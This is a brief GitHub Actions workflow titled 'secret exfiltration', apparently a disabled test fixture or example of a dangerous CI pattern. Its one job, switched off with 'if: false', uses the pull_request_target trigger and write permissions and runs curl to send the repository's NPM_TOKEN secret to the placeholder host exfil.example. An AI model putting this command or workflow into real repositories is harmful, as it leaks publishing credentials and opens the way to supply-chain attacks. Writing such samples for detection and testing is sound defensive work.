name: secret exfiltration

on: pull_request_target

permissions:
  contents: write

jobs:
  exfiltrate:
    if: ${{ false }}
    runs-on: ubuntu-latest
    steps:
      - run: curl "https://exfil.example/collect?token=${{ secrets.NPM_TOKEN }}"
